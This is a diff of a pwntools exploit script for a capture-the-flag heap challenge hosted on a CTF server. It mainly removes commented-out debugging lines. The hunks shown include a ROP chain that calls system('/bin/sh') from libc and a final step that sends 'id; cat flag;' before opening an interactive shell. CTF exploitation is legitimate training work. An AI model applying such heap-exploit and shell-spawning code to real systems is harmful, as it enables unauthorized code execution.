@@ -1,7 +1,4 @@
 #!/usr/bin/env python
-# from ctypes import cdll
-# libc = cdll.LoadLibrary('libc.so.6')
-# from pathlib import Path
 from pwn import *
 sys.tracebacklimit = 3
 context(endian = "little", encoding='ascii') # arch='amd64'
@@ -11,16 +8,8 @@ os.chdir('./dist')
 exe_path = '%s_patched' % ('./challenge')
 e = context.binary = ELF(exe_path, checksec=False)
 libc_path = ('./libc.so.6')
-# libc_path = ('/lib/x86_64-linux-gnu/libc.so.6')
 libc = ELF(libc_path, checksec=False)
-gdbscript = """\
-#source /home/hacker/.gef.py
-#gef config context.layout ''
-# -- exe
-break *0x401234
-continue
-# disp/3i $pc
-"""
+gdbscript = ""
 host, port = ('nc monsters.ctf.theromanxpl0.it 7009').split()[-2:]
 start_time = time.time()
 
@@ -132,7 +121,6 @@ def heap_atk(fakechunk_addr):
     info(f'CALC: {main_rip_ptr  = :#x}')
 
     rop = ROP(libc)
-    # rop.raw(rop.ret)
     rop.system(next(libc.search('/bin/sh')))
     print(rop.dump())
 
@@ -147,7 +135,6 @@ def heap_atk(fakechunk_addr):
     cmd(5) # quit
     pass
 
-# libc.sym['__libc_start_call_main'] = 0x2a150
 prompt = 'Exit\n> '
 r = conn()
 def main():
@@ -174,12 +161,7 @@ def main():
 try:
     main()
     log.success(f'duration: {time.time() - start_time}')
-    # r.clean(0.2)
     r.sendline('id; cat flag;')
     r.interactive()
-# except KeyboardInterrupt:
-#     import traceback
-#     traceback.print_exc()
-#     exit(2)
 except Exception as exc:
     raise exc
